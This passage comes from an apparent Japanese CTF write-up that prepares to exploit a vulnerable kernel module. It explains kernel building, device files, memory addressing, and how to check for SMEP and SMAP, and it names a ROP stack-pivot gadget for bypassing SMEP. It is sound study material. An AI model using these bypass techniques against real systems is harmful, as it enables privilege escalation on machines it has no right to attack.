<p>ターゲットバージョンは、問題環境と同じ <code class="language-text">6.3.2</code> に変更します。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 710px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/6b4630d5064372cea7def85d11977f21/7131f/image-20230608133221693.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 54.58333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAALCAYAAAB/Ca1DAAAACXBIWXMAAAsTAAALEwEAmpwYAAABx0lEQVQoz3WSy66bQBBE+ddk5y+IsomyyT6bbKIr3Sj4Ymzer8Fg3piXsVf5nkpP+2IhK1kUrRH06eoalKrIUOQp4sgneUhiH/25RNtUKMu78rzg2jQtqzt3OK/ULeo6KD/UGzbf/uDDpwybLyU+fq6x+drj+0uNLI0JRDXLCdRgHEfW7XbD9Xp9aJ5n1uVygSKSFraY8KIK/HqL8LoV+PnqQdMDRGGE0ylDXTfsTIILcns8JkjTE7+Tki7b9szDlCyll0kMy7Lg2iYC36Vqwaaz5wUwDiZsJ4CuG9jrBxzoLETMCoIQVVUzaJomlpLT1LYbsdVMqL/fqMmAYdjYqhp2uz10kknnJEm5WWa5rLhedZEyTSMD96aHkCZaloPD3oTjuPBcnx3q5CyKBE60pgRLyUzlmsMwMOjhsCgKFFUD1xcQ1OQ4HlwC+bSuTfAwFDxEAmWGsTii73puXkDrqqQ0TQar7izORzrSNJ3V1PJmJ/4dpJO2bfmClvWeYQwsy5JzkStbpk353cEyN5mZhPX9wMEvmS3rPcMYONNjnGaIOOWVZW4yI98PuBZFye7WN/k/2Pul3D8YqGEYxkfj4mj98b8Az/oLjmHHLgZxBl4AAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/6b4630d5064372cea7def85d11977f21/8ac56/image-20230608133221693.webp 240w,
/static/6b4630d5064372cea7def85d11977f21/d3be9/image-20230608133221693.webp 480w,
/static/6b4630d5064372cea7def85d11977f21/457aa/image-20230608133221693.webp 710w"
              sizes="(max-width: 710px) 100vw, 710px"
              type="image/webp"
            />
          <source
            srcset="/static/6b4630d5064372cea7def85d11977f21/8ff5a/image-20230608133221693.png 240w,
/static/6b4630d5064372cea7def85d11977f21/e85cb/image-20230608133221693.png 480w,
/static/6b4630d5064372cea7def85d11977f21/7131f/image-20230608133221693.png 710w"
            sizes="(max-width: 710px) 100vw, 710px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/6b4630d5064372cea7def85d11977f21/7131f/image-20230608133221693.png"
            alt="image-20230608133221693"
            title="image-20230608133221693"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>カーネルバージョンを変更したら、Toolchains の Custom kernel headers series のバージョンも対応するバージョン(6.3.x) に変えておかないと make がかなり進んでからエラーになるという罠があるので注意します。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 684px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/f6459d0a4f3be8aae6e77c251b2ea770/2c288/image-20230608182618542.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 82.5%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAARCAYAAADdRIy+AAAACXBIWXMAAAsTAAALEwEAmpwYAAACjUlEQVQ4y4VU227aQBTkIyv1uapUVWraPlTqY6OqUqL+RUIA4xu+Y3zDBmwDNrhp0uR3pucswkogtA+jtS3veObMrDuvvtzh0+UfnF0+4N33e3y4eMT7H/f4SPf87O35Hc4uHvD55yPefHvE668PMPwGt79qVPUGm81zdCTFR29gYiA7uLox0B8Y6PYMXHU19CUL1/xMMiHJNhwvw7xosFrXtLlGXdeCZL8KwjzPMfF9WKaJMAhgjEbiPp0miKMIy7JAtV5iU6+x3VT4fbt9puiQtJPNC6iaAZ0wHCqQBjIMw4Kum/DHEwRBhMkkRJbNEMcJfD9AnhdYr9dYrVbHCv0wgaoacBwXiqJBllWYpg3X9RBFMbI0wzSZIiFMp6kgTGkN6CPz+aIlbBVOiNA0HXjemFQRse2SbZNGYJP1oFWyXC5pXaMsSnHNKp8qbAmj6QK9vgyFlI3I5lBShEpN1SEPVaEsDCMURFSWpdi43W4FDu3uZjjLYZEqzx3DppXBs0vJKltO0xRVVQnslTzFkcIgnkGhGcociLQLhJWNyDaHMZvNRSBlubN5SHDUQ2+SUMd0EQrPzCRC07SEOla1t3Zo7yShM44wkFSMKRROlqvD89M06uMkEAHU1bHNU+jYRHjVHcAlhdxBhqaO0L3uUZ108RGe5/+stoRxkpHdnTpD2LVhW46oD/eOX9qluvlnKC0h95BPhU4WORRW1e9JooscjCJrQiGH0jRN+4GmOVGbME7huD5Z9miOu9WybFF0JuKEOWnGnFAUBfJFLu5fVBgkM3RvJCq1gUF/KFRyyTkUJuSqLBaL9izzzyTLMvpxxCf+NsUSLinjExEEIRLaxPXhzfsTsQdbfnr9kuW/Ez1HROjF9DkAAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/f6459d0a4f3be8aae6e77c251b2ea770/8ac56/image-20230608182618542.webp 240w,
/static/f6459d0a4f3be8aae6e77c251b2ea770/d3be9/image-20230608182618542.webp 480w,
/static/f6459d0a4f3be8aae6e77c251b2ea770/e213b/image-20230608182618542.webp 684w"
              sizes="(max-width: 684px) 100vw, 684px"
              type="image/webp"
            />
          <source
            srcset="/static/f6459d0a4f3be8aae6e77c251b2ea770/8ff5a/image-20230608182618542.png 240w,
/static/f6459d0a4f3be8aae6e77c251b2ea770/e85cb/image-20230608182618542.png 480w,
/static/f6459d0a4f3be8aae6e77c251b2ea770/2c288/image-20230608182618542.png 684w"
            sizes="(max-width: 684px) 100vw, 684px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/f6459d0a4f3be8aae6e77c251b2ea770/2c288/image-20230608182618542.png"
            alt="image-20230608182618542"
            title="image-20230608182618542"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>また、調査を用意にするために strip を外したり debugging info を付与する設定を有効化します。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 690px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/1645fe72313b2b1e35f5c6df0fc78531/1e043/image-20230608112031052.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 60.83333333333334%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAMCAYAAABiDJ37AAAACXBIWXMAAAsTAAALEwEAmpwYAAACR0lEQVQoz2VS2W7TUBD1TyMeeaBQoSoCISjdaNNSN87ifUtix0viLYudiqT5ncPMDZQUHo5GGeueOUukwUDDg6yAp64Z0A0Hmm7BtBx4no/lcimwWq3ErOtaoGma593hdykMQmiGC9t24XtDWKYN1/UFmNAwLLFP0yniOMF0OsNsliFNUszn8/9IJcv2ICs6lE4Pqqrj7k6GSaTdbh+OQ0f8IUajMR3wMJlEyPOCSKdIiPyQ8FlhTJe8UQTLciHfd4R1y7KhqQYeHhRBzIdYKROzOn58aJnnH0hBEMF2x/DIokYZmvTQsTkCBwHFwTbjOBZkCR3n32VZvrD6UuE0h24NqRAdstwR1pmYVfmcoW7uc3U8EQHHkec5qqoSBP8qlcJJjI6iCiK2xzYHfRXqQIdObbNSh8iCcSDK8Qj7YmbIsgwZRXCYpeR5I6i6TSqsfdNUAqvhh54/Fm0WRSEUpWmKiIrhUrggjoBRldVfwqJawrSH6PVUUuJTViGRjhCGET2KMYkSUpJTbnP6/zVYrx/J5no/CbxbrmosFkxIlhfzDIZpwLVU9Lsy9IEi0O38gNZXMI3HiEJfzHwWCcyLBFUeo8giPDYl1nWB7c8FmpoUXvcbnHwb4fPlGCenPj6dD/H5akII8PUmwrVSod3N0O5VuOkWuO0V+N4paV/i4j6DrK/Q7hMGaySzGtLr1hpHpw3eX2zx7nyD44uNmB+utji+3OLobIvWzQ5H509otXf4eLvD27MnnFzvfuMJb75s8Kq1gRs0+AWxffnhfohaTAAAAABJRU5ErkJggg=='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/1645fe72313b2b1e35f5c6df0fc78531/8ac56/image-20230608112031052.webp 240w,
/static/1645fe72313b2b1e35f5c6df0fc78531/d3be9/image-20230608112031052.webp 480w,
/static/1645fe72313b2b1e35f5c6df0fc78531/8efd0/image-20230608112031052.webp 690w"
              sizes="(max-width: 690px) 100vw, 690px"
              type="image/webp"
            />
          <source
            srcset="/static/1645fe72313b2b1e35f5c6df0fc78531/8ff5a/image-20230608112031052.png 240w,
/static/1645fe72313b2b1e35f5c6df0fc78531/e85cb/image-20230608112031052.png 480w,
/static/1645fe72313b2b1e35f5c6df0fc78531/1e043/image-20230608112031052.png 690w"
            sizes="(max-width: 690px) 100vw, 690px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/1645fe72313b2b1e35f5c6df0fc78531/1e043/image-20230608112031052.png"
            alt="image-20230608112031052"
            title="image-20230608112031052"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>設定が完了したら、root ユーザで以下のコマンドを実行してカーネルをビルドします。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># Linux カーネルのビルド</span>
<span class="token function">sudo</span> <span class="token function">su</span>
<span class="token function">make</span></code></pre></div>
<p>設定が上手くいっていれば、1 時間程度で <code class="language-text">output/images</code> にカーネルイメージがビルドされます。</p>
<h2 id="カーネルモジュールデバイスドライバ" style="position:relative;"><a href="#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90" aria-label="カーネルモジュールデバイスドライバ permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>カーネルモジュール(デバイスドライバ)</h2>
<h3 id="カーネルモジュールデバイスドライバの実体" style="position:relative;"><a href="#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%83%A2%E3%82%B8%E3%83%A5%E3%83%BC%E3%83%AB%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%83%89%E3%83%A9%E3%82%A4%E3%83%90%E3%81%AE%E5%AE%9F%E4%BD%93" aria-label="カーネルモジュールデバイスドライバの実体 permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>カーネルモジュール(デバイスドライバ)の実体</h3>
<p>Linux におけるデバイスドライバは、メモリ内のカーネル空間内で、Linux カーネルイメージ内のデバイスドライバ(<code class="language-text">.o</code>) とは別のモジュール(<code class="language-text">.ko</code>)として動作します。(ただし、デバイスドライバはカーネルの一部として動作します)</p>
<p>デバイスドライバは静的リンク(カーネルイメージに組み込まれる)か、または動的リンク(動作中のカーネルに対してロード、アンロードができる)でカーネルに組み込まれます。</p>
<p>動的リンク型のデバイスドライバは、<code class="language-text">insmod</code> コマンドでロードされます。また、<code class="language-text">rmmod</code> でアンロードされます。</p>
<p>Linux カーネルはモノリシックなカーネルなので、カーネルイメージと追加したデバイスドライバは同じカーネルメモリ空間を共有します。</p>
<p>今回の問題環境では、起動時に <code class="language-text">/bin/sh /etc/init.d/S99ctf start</code> が実行されていました。</p>
<p>S99ctf は以下のようなスクリプトであり、<code class="language-text">/root/ctf4b.ko</code> を <code class="language-text">insmod</code> コマンドでロードしていることがわかります。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token shebang important">#!/bin/sh</span>
<span class="token comment"># Setup</span>
mdev -s
<span class="token function">mount</span> -t proc none /proc
stty -opost

<span class="token comment"># Install kernel driver</span>
insmod /root/ctf4b.ko
<span class="token function">mknod</span> -m <span class="token number">666</span> /dev/ctf4b c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> ctf4b /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $1;}'</span><span class="token variable">`</span></span> <span class="token number">0</span>

<span class="token comment"># User shell</span>
<span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span>Boot took <span class="token variable"><span class="token variable">$(</span><span class="token function">cut</span> -d<span class="token string">' '</span> -f1 /proc/uptime<span class="token variable">)</span></span> seconds<span class="token entity" title="\n">\n</span>"</span>
<span class="token builtin class-name">echo</span> <span class="token string">"[ Welcome to SECCON Beginners CTF 2023 ]"</span>
setsid cttyhack setuidgid <span class="token number">0</span> <span class="token function">sh</span>

<span class="token comment"># Cleanup</span>
<span class="token function">umount</span> /proc
poweroff -d <span class="token number">0</span> -f</code></pre></div>
<h3 id="デバイスファイルを用意する" style="position:relative;"><a href="#%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%82%92%E7%94%A8%E6%84%8F%E3%81%99%E3%82%8B" aria-label="デバイスファイルを用意する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>デバイスファイルを用意する</h3>
<p>ユーザ空間で動作する通常のプログラムは、カーネル空間で動作するデバイスドライバとは独立したメモリ領域で稼働しています。</p>
<p>そのため、「デバイスファイル」という、プログラムとデバイスドライバ間で情報を交換するためのインターフェースを使用します。</p>
<p>デバイスファイルは一般的に <code class="language-text">/dev</code> 配下に作成されます。</p>
<p>今回の問題では <code class="language-text">/dev/ctf4b</code> というキャラクタデバイスが、 ctf4b とのインターフェースになります。</p>
<p>デバイスファイルは常に 1 つのデバイスドライバのみと紐づけされる必要があるため、<code class="language-text">mknod</code> コマンドでデバイスファイルを作成する場合には、対象のデバイスドライバのメジャーバージョンと、対応するハードウェアを指定するマイナーバージョンを指定します。</p>
<p>以下の例では、<code class="language-text">/proc/devices</code> の情報から ctf4b のメジャーバージョンを取得し、マイナーバージョンには 0 を指定しています。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token function">mknod</span> -m <span class="token number">666</span> /dev/ctf4b c <span class="token variable"><span class="token variable">`</span><span class="token function">grep</span> ctf4b /proc/devices <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'{print $1;}'</span><span class="token variable">`</span></span> <span class="token number">0</span></code></pre></div>
<p>ちなみに <code class="language-text">-m</code> はデバイスファイルの権限を指定しており、 666 は読み書きを許可する <code class="language-text">-m 'a=rw'</code> と同等の設定値に当たります。</p>
<p>また、<code class="language-text">c</code> ではデバイスファイルの種類をキャラクタデバイスファイルに指定しています。</p>
<p>参考：<a href="https://ja.wikipedia.org/wiki/%E3%83%87%E3%83%90%E3%82%A4%E3%82%B9%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB" target="_blank" rel="nofollow noopener noreferrer">デバイスファイル - Wikipedia</a></p>
<h2 id="メモリアドレッシングについて" style="position:relative;"><a href="#%E3%83%A1%E3%83%A2%E3%83%AA%E3%82%A2%E3%83%89%E3%83%AC%E3%83%83%E3%82%B7%E3%83%B3%E3%82%B0%E3%81%AB%E3%81%A4%E3%81%84%E3%81%A6" aria-label="メモリアドレッシングについて permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>メモリアドレッシングについて</h2>
<p>Linux 環境のメモリは、大きく以下の 3 種類に分類されます。</p>
<ul>
<li>論理アドレス：オペラントと命令アドレスを指定するときに使用するアドレス</li>
<li>リニアアドレス：仮想アドレスと同義であり、論理アドレスから物理アドレスに変換するための一次変換後のアドレス</li>
<li>物理アドレス：メモリチップ内のメモリセルを指定する際に使用するアドレス</li>
</ul>
<p>そして、論理アドレスから物理アドレスを特定する一般的な方法として、セグメンテーションとページングが利用されます。</p>
<p>セグメンテーションでは、論理アドレスからリニアアドレス(仮想アドレス)を特定します。また、ページングではリニアアドレス(仮想アドレス)から物理アドレスを特定します。</p>
<p>なお、セグメンテーションは x86_64 では利用されておらず、論理アドレスとリニアアドレス(仮想アドレス)は実質的に同じである「基本フラットモデル」になっています。</p>
<p>※ ただし、カーネル空間のセグメントは CPU のリングプロテクションによって ring0 の権限でしかアクセスできないように制限されます。</p>
<p>参考：<a href="https://blog.ishikawa.tech/entry/2018/12/10/215234" target="_blank" rel="nofollow noopener noreferrer">セグメント機構とCPUの動作モード(Linux(64bit)との関係性) - 人生は勉強ブログ</a></p>
<p>ちなみに、x86 でのセグメント管理については以前に xv6OS のソースコードを読んだ時に少し勉強しました。</p>
<p>参考：<a href="/unix-xv6-008-kernel-main-05">xv6OSを真面目に読みこんでカーネルを完全に理解する -セグメントディスクリプタ初期化 編-</a></p>
<p>そしてページングについてですが、詳解 Linux カーネルによると、少なくともページング機構については x86 と x86_64 アーキテクチャはどちらも同じページングモデルが適用されています。(ただし、32 bit OS のページング機構が 2 階層なのに対して、 2.6.11 以降の 64 bit アーキテクチャでは 4 または 5 階層のページングモデルを使用します。)</p>
<p>このページングモデルでは、CR3 レジスタに保持されている値とグローバルディレクトリの情報を組み合わせて、ページグローバルテーブル(レベル 4 テーブル)の特定のエントリを指定するところから始まり、最終的にページテーブルから取得したページのオフセットを使用して物理アドレスのオフセットを特定します。</p>
<p>参考：<a href="https://qiita.com/juntaki/items/875bec8b429f6085bc0b" target="_blank" rel="nofollow noopener noreferrer">Linux x86_64のメモリアドレッシング - Qiita</a></p>
<p>参考：<a href="https://speakerdeck.com/rkx1209/kaneruekusupuroitoniyorusisutemuquan-xian-duo-qu?slide=6" target="_blank" rel="nofollow noopener noreferrer">カーネルエクスプロイトによるシステム権限奪取 - Speaker Deck</a></p>
<h2 id="カーネルのセキュリティ機構の有無を特定する" style="position:relative;"><a href="#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%81%AE%E3%82%BB%E3%82%AD%E3%83%A5%E3%83%AA%E3%83%86%E3%82%A3%E6%A9%9F%E6%A7%8B%E3%81%AE%E6%9C%89%E7%84%A1%E3%82%92%E7%89%B9%E5%AE%9A%E3%81%99%E3%82%8B" aria-label="カーネルのセキュリティ機構の有無を特定する permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>カーネルのセキュリティ機構の有無を特定する</h2>
<p>通常のユーザモードプロセスのエクスプロイトと同じように、カーネルエクスプロイトでもセキュリティ機構に注意を払う必要があるようです。</p>
<p>主だったセキュリティ機構の種類とその確認方法については以下の記事が非常に参考になりました。</p>
<p>参考：<a href="https://pawnyable.cafe/linux-kernel/introduction/security.html" target="_blank" rel="nofollow noopener noreferrer">セキュリティ機構 | PAWNYABLE!</a></p>
<h3 id="smep-supervisor-mode-execution-prevention" style="position:relative;"><a href="#smep-supervisor-mode-execution-prevention" aria-label="smep supervisor mode execution prevention permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>SMEP (Supervisor Mode Execution Prevention)</h3>
<p>SMEP が有効(CR4レジスタの21ビット目がたっている)な場合、実行中のカーネル空間のコードからユーザ空間のコードをいきなり実行することが禁止されます。</p>
<p>つまり SMEP が有効な場合はカーネルエクスプロイトで RIP を奪われてもそのままユーザ空間のコード実行を行うことができなくなります。</p>
<p>SMEP が有効かどうかは以下のコマンドで確認できます。(何も出力されない場合は SMEP は無効化されています)</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># SMEP が有効かを確認する</span>
<span class="token function">cat</span> /proc/cpuinfo <span class="token operator">|</span> <span class="token function">grep</span> smep</code></pre></div>
<p>今回の問題バイナリの環境では Qemu の <code class="language-text">-cpu</code> オプションに <code class="language-text">+smep</code> は指定されておらず、SMEP が無効化されていることがわかります。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 440px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/79c174d448032d6f4f9195e1148584ea/48c0e/image-20230606213506904.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 29.166666666666668%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAA0klEQVQY062OWw/BQBCFvbgWL+5SlDYa0d0t1QtSFGmEEBKJ//9Ljt19aEi8EA8nc3bO7DeTWjQZdlqA42iDrebjNI5wtWMchiFuk1j6C91jXqM4mCvc3SOinodHcEZsLEEyGuyCkSgVqg7O1g7LBoNfsRC2pgjbUyzqFFHXk28Bc8qm7G86LoIqwVqd8T82aG7wDrSLBpySCYtvEiHJ9KUnWV7TmrxAeJbXpRc9mh0kMwIisgRIFR0sp79t+UavMAlkCjd5HhR+h34A8iv/ABN6AsN3qp2N6QM4AAAAAElFTkSuQmCC'); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
              srcset="/static/79c174d448032d6f4f9195e1148584ea/8ac56/image-20230606213506904.webp 240w,
/static/79c174d448032d6f4f9195e1148584ea/23a50/image-20230606213506904.webp 440w"
              sizes="(max-width: 440px) 100vw, 440px"
              type="image/webp"
            />
          <source
            srcset="/static/79c174d448032d6f4f9195e1148584ea/8ff5a/image-20230606213506904.png 240w,
/static/79c174d448032d6f4f9195e1148584ea/48c0e/image-20230606213506904.png 440w"
            sizes="(max-width: 440px) 100vw, 440px"
            type="image/png"
          />
          <img
            class="gatsby-resp-image-image"
            src="/static/79c174d448032d6f4f9195e1148584ea/48c0e/image-20230606213506904.png"
            alt="image-20230606213506904"
            title="image-20230606213506904"
            loading="lazy"
            style="width:100%;height:100%;margin:0;vertical-align:middle;position:absolute;top:0;left:0;"
          />
        </picture>
  </a>
    </span></p>
<p>SMEP のみが有効な環境でエクスプロイトを通すことが可能な手法としては、ROP ガジェットを利用した Stack Pivot があるようです。</p>
<p>参考にしている記事の例だと、例えば以下のようなガジェットを使用して RSP を変更して Stack Pivot を行うことで制御した RIP から ROP Chain を悪用したコード実行を可能にすることができるようです。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash">mov esp, 0x12345678<span class="token punctuation">;</span> ret<span class="token punctuation">;</span></code></pre></div>
<h3 id="smap-supervisor-mode-access-prevention" style="position:relative;"><a href="#smap-supervisor-mode-access-prevention" aria-label="smap supervisor mode access prevention permalink" class="anchor before"><svg aria-hidden="true" focusable="false" height="16" version="1.1" viewBox="0 0 16 16" width="16"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>SMAP (Supervisor Mode Access Prevention)</h3>
<p>SMAP(CR4レジスタの22ビット目) はカーネル空間からユーザ空間のメモリを読み書きできなくするための機構です。</p>
<p>Stack Pivot でユーザ空間のプロセスが確保したメモリ領域を使用した ROP Chain の防止や、カーネルドライバなどの脆弱性を悪用して任意のアドレスのデータをリークしたり書き換えたりする AAR(Arbitrary Address Read) や AAW(Arbitrary Address Write) の攻撃を防ぐ効果があります。</p>
<p>SMAP が有効かどうかは以下のコマンドで確認可能です。</p>
<div class="gatsby-highlight" data-language="bash"><pre class="language-bash"><code class="language-bash"><span class="token comment"># SMAP が有効かを確認する</span>
<span class="token function">cat</span> /proc/cpuinfo <span class="token operator">|</span> <span class="token function">grep</span> smap</code></pre></div>
<p>また、問題環境では Qemu の起動時に <code class="language-text">+smap</code> の cpu オプションが与えられていないので、SMAP も無効化されていることがわかります。</p>
<p><span
      class="gatsby-resp-image-wrapper"
      style="position: relative; display: block; margin-left: auto; margin-right: auto; max-width: 395px; "
    >
      <a
    class="gatsby-resp-image-link"
    href="/static/62777bfb814d8f36b94eb1022fc957e1/2cb6c/image-20230606215544180.png"
    style="display: block"
    target="_blank"
    rel="noopener"
  >
    <span
    class="gatsby-resp-image-background-image"
    style="padding-bottom: 32.08333333333333%; position: relative; bottom: 0; left: 0; background-image: url('data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABQAAAAGCAYAAADDl76dAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAoUlEQVQY02OwlzH576lh9z/E1Ou/n57Lf29tx//xjqH//XSd/0daB/yPdwr7H2nl/99Hx+m/lZg+XMxD3e5/HFBdjF3Qf30Opf8GXCpgzGAraQQ00P6/PqcyGBvxqoElQGxDHtX/BtxANgdEzoBb9b8xnwZUXBWingehHmwgzCCYDch8XHK41IBoBphiZFvQMbrB2NTDXUhIE6mYgVID0DEAPQ6rPt2jbq0AAAAASUVORK5CYII='); background-size: cover; display: block;"
  ></span>
  <picture>
          <source
